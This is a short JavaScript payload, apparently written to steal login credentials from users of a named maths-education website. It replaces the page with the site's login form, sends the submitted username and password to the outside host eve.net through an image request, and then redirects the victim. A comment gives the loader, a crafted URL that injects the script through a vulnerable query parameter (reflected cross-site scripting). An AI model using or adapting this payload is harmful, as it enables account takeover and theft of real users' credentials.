(async()=>document.write(await fetch('/login.php').then(e=>e.text())+`<script>a=setTimeout,a(()=>$("form[action*=login]").submit(e=>{e.preventDefault(),c=e.currentTarget,(new Image).src="//eve.net/"+c[0].value+"||"+c[1].value,a(()=>window.location="/do-question.php?aaid=10972720",1e3)}),4e3)</script>`))()
// loader:
// https://drfrostmaths.com/worksheets.php?topic=[insert fake topic here]&wdid=-3;</script><script src=[url to this script]><!--
